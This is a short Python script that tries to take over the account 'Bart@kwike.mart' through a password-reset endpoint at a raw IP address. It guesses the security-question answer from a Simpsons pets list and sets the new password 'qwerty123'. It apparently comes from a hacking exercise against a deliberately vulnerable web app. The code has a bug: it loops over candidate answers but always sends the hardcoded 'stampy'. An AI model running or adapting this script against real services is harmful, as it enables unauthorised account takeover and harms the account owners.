import json

import requests

s = requests.Session()
# https://en.wikipedia.org/wiki/Simpson_family#Other_pets
# answers = ["Laddie", "laddie", "Santa's Little Helper", "Snowball II", "Snowball"]
answers = ["snowball"]

for answer in answers:
    data = {"email": "Bart@kwike.mart", "answer": "stampy", "new": "qwerty123", "repeat": "qwerty123"}
    data_json = json.dumps(data)
    headers = {'Content-type': 'application/json'}

    r = s.post('http://43.241.202.33:3003/rest/user/reset-password',
               data=data_json,
               headers=headers,
               )
    print(r)
